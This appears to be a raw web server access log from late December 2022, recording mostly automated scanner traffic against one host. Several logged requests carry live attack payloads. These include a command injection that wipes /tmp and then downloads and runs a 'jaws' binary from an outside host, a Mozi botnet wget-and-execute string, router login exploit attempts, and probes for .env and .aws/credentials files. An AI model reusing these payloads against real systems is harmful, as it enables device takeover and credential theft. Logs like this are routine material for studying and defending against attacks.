209.141.35.50 - - [27/Dec/2022:19:21:10 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
162.243.144.22 - - [27/Dec/2022:20:21:48 +0100] "GET /hudson HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
170.64.153.151 - - [27/Dec/2022:20:46:37 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03F\xF5Y7/\x06\xD7 \xE1\x07\xABVH\x8A\xC0\x22\x98\xDDt\xA8jH\x0E\xF5\xEC\xA8t\xF9_\xD5D=\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
170.64.153.151 - - [27/Dec/2022:20:46:37 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03c\xF1\xFAv\x07\x99\xB1*\x138\xFB%\xA46" 400 154 "-" "-"
170.64.153.151 - - [27/Dec/2022:20:46:37 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.89.196.211 - - [27/Dec/2022:21:16:47 +0100] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.235.24.20 - - [27/Dec/2022:21:19:30 +0100] "GET / HTTP/1.0" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.227.254.54 - - [27/Dec/2022:21:58:26 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
92.118.39.29 - - [27/Dec/2022:22:06:50 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
152.89.196.211 - - [27/Dec/2022:22:16:42 +0100] "GET /actuator/gateway/routes HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
207.154.195.171 - - [27/Dec/2022:22:19:16 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
107.170.226.7 - - [27/Dec/2022:22:35:55 +0100] "GET /actuator/health HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
162.243.146.19 - - [27/Dec/2022:22:39:56 +0100] "GET /portal/redlion HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
209.141.35.50 - - [27/Dec/2022:22:46:24 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
212.154.7.246 - - [27/Dec/2022:22:55:51 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.154.7.246 - - [27/Dec/2022:22:55:52 +0100] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.40.109 - - [27/Dec/2022:23:12:58 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
109.74.204.123 - - [27/Dec/2022:23:17:46 +0100] "GET / HTTP/1.0" 301 166 "-" "-"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /Portal/Portal.mwsl HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /nmaplowercheck1672179478 HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET / HTTP/1.0" 301 166 "-" "-"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET / HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /index.pl HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "POST /scripts/WPnBr.dll HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /HNAP1 HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /docs/cplugError.html/ HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET /menu.shtml HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "HEAD / HTTP/1.1" 301 0 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:58 +0100] "GET / HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /inicio.jsp HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /pools/default/buckets HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /.git/HEAD HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /inicio.asp HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbbb0100000001" 400 154 "-" "-"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /pools HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET / HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /admin.aspx HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /CSS/Miniweb.css HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /Portal0000.htm HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /Uq4b HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /menu.cgi HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /__Additional HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "POST /sdk HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:17:59 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "curl/7.54.0"
109.74.204.123 - - [27/Dec/2022:23:18:00 +0100] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xA1\xAE'z\xFE\x80dT1|\x15\x8F\xF3&%\xC2\x94\x9A\xB8\xEFm\xBF\x16" 400 154 "-" "-"
109.74.204.123 - - [27/Dec/2022:23:18:08 +0100] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03%\x86f\x93\xEDJ,v\xAB\xF0\x89\x8C\xD7_}E\x8DSA}\xDD\xCB\x0935\xAD\xD3!8\xC6\xB0\xCA \xDD\xDA|ybT\x0F9\x87\xC8\x13\xCEv\xF6\xFD\xD4\x8A\x19\xFD\x9C[\x1Dp\xA1'a\x9F(\x05\xCC\x1F\x01\x00\x9C\x13\x02\x13\x03\x13\x01\x003\x009\x005\x00/\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\xC0" 400 154 "-" "-"
109.74.204.123 - - [27/Dec/2022:23:18:10 +0100] "GET / HTTP/1.0" 301 166 "-" "-"
109.74.204.123 - - [27/Dec/2022:23:18:10 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
45.33.109.190 - - [28/Dec/2022:00:28:50 +0100] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 154 "-" "-"
45.33.109.190 - - [28/Dec/2022:00:28:50 +0100] "GET /ew4L HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
45.33.109.190 - - [28/Dec/2022:00:28:51 +0100] "GET /RFoV HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
110.78.174.230 - - [28/Dec/2022:00:52:39 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 166 "-" "Hello, world"
51.159.152.255 - - [28/Dec/2022:01:33:59 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
51.159.152.255 - - [28/Dec/2022:01:33:59 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
205.185.118.237 - - [28/Dec/2022:02:16:23 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [28/Dec/2022:02:16:23 +0100] "" 400 0 "-" "-"
82.114.109.66 - - [28/Dec/2022:02:52:43 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.142.125.220 - - [28/Dec/2022:03:32:03 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.220 - - [28/Dec/2022:03:32:03 +0100] "PRI * HTTP/2.0" 400 154 "-" "-"
205.185.118.237 - - [28/Dec/2022:04:11:41 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [28/Dec/2022:04:11:41 +0100] "" 400 0 "-" "-"
141.255.160.234 - - [28/Dec/2022:04:11:56 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
46.130.53.12 - - [28/Dec/2022:04:26:07 +0100] "GET / HTTP/1.0" 301 166 "-" "-"
159.203.192.21 - - [28/Dec/2022:05:03:42 +0100] "MGLNDD_217.160.100.194_80" 400 154 "-" "-"
101.0.34.57 - - [28/Dec/2022:05:34:29 +0100] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 154 "-" "-"
20.237.225.150 - - [28/Dec/2022:05:36:20 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.237.225.150 - - [28/Dec/2022:05:36:21 +0100] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
162.243.150.11 - - [28/Dec/2022:06:02:45 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
209.141.35.50 - - [28/Dec/2022:06:15:58 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
123.14.251.78 - - [28/Dec/2022:06:22:51 +0100] "POST /HNAP1/ HTTP/1.0" 301 166 "-" "-"
177.11.168.102 - - [28/Dec/2022:06:24:44 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.227.254.54 - - [28/Dec/2022:06:36:49 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
141.255.160.234 - - [28/Dec/2022:06:37:53 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
44.202.66.75 - - [28/Dec/2022:06:56:43 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.202.66.75 - - [28/Dec/2022:06:56:43 +0100] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.156.186.32 - - [28/Dec/2022:07:01:45 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
167.71.102.95 - - [28/Dec/2022:07:36:22 +0100] "\x00\x0E8\x16\xFE\xD8)\xAC\x930\xA3\x00\x00\x00\x00\x00" 400 154 "-" "-"
103.187.36.97 - - [28/Dec/2022:07:46:43 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 166 "-" "Hello, world"
103.187.36.97 - - [28/Dec/2022:07:46:44 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 166 "-" "Hello, world"
103.203.57.1 - - [28/Dec/2022:08:29:54 +0100] "GET / HTTP/1.1" 301 166 "-" "HTTP Banner Detection (https://security.ipip.net)"
141.255.160.234 - - [28/Dec/2022:08:43:28 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
92.118.39.29 - - [28/Dec/2022:08:47:36 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
109.108.222.236 - - [28/Dec/2022:08:55:57 +0100] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 154 "-" "-"
167.94.138.62 - - [28/Dec/2022:08:57:25 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
167.94.138.62 - - [28/Dec/2022:08:57:26 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.62 - - [28/Dec/2022:08:57:26 +0100] "PRI * HTTP/2.0" 400 154 "-" "-"
35.195.93.98 - - [28/Dec/2022:09:01:23 +0100] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.28.1"
209.141.35.50 - - [28/Dec/2022:10:26:50 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
128.14.141.34 - - [28/Dec/2022:10:28:53 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.35.50 - - [28/Dec/2022:10:53:03 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
91.191.209.142 - - [28/Dec/2022:11:07:24 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
167.248.133.45 - - [28/Dec/2022:11:13:50 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
167.248.133.45 - - [28/Dec/2022:11:13:50 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.45 - - [28/Dec/2022:11:13:50 +0100] "PRI * HTTP/2.0" 400 154 "-" "-"
159.223.79.23 - - [28/Dec/2022:12:49:20 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1D,\xE0K\xDAY0A\xB1}\xC0\x81\xFF\x90[\x15@\xA0\x86\x99\xD3\x15\xE3\x95\xAB\x14\xE8\x0F\x04\x8D\xC2\xB1\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.79.23 - - [28/Dec/2022:12:49:20 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03[G\xF6\x80\xF9.\x16\xC2B\x97\x8BR+\xA8\x16O\xD3\x1B\xDF\xBE\xE8\xE3Z\xA1\xB0\xCC\xBF\xF8\x8F\x02\x5C\x7F\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.79.23 - - [28/Dec/2022:12:49:20 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
209.141.40.109 - - [28/Dec/2022:13:02:50 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.40.109 - - [28/Dec/2022:13:24:26 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
205.185.118.237 - - [28/Dec/2022:13:57:17 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [28/Dec/2022:13:57:17 +0100] "" 400 0 "-" "-"
60.191.125.35 - - [28/Dec/2022:14:39:02 +0100] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
60.191.125.35 - - [28/Dec/2022:14:39:02 +0100] "CONNECT skylinewebservice.de:443 HTTP/1.1" 400 154 "-" "-"
45.227.254.54 - - [28/Dec/2022:14:59:00 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
192.53.171.56 - - [28/Dec/2022:15:12:54 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
185.142.236.40 - - [28/Dec/2022:15:34:03 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.40 - - [28/Dec/2022:15:34:04 +0100] "GET /robots.txt HTTP/1.1" 301 166 "-" "-"
185.142.236.40 - - [28/Dec/2022:15:34:04 +0100] "GET /sitemap.xml HTTP/1.1" 301 166 "-" "-"
185.142.236.40 - - [28/Dec/2022:15:34:04 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 166 "-" "-"
185.142.236.40 - - [28/Dec/2022:15:34:06 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
185.142.236.40 - - [28/Dec/2022:15:34:10 +0100] "\x03\xDFS\xACc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 154 "-" "-"
205.185.118.237 - - [28/Dec/2022:15:47:05 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [28/Dec/2022:15:47:05 +0100] "" 400 0 "-" "-"
109.237.97.180 - - [28/Dec/2022:15:52:11 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:11 +0100] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x5C\x10\xA3\xA7\x93\x83\xA1\x8B\x86\xAD\xE5\x16\x86\x8F\xD1\x92B\xEF\xA6oN,\xC0\xFA\xB3\xCB\xFD;!\xE5\xB4\xB8 \xF0\x9D" 400 154 "-" "-"
109.237.97.180 - - [28/Dec/2022:15:52:11 +0100] "POST /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:11 +0100] "GET /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:11 +0100] "POST /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "GET /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "POST /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
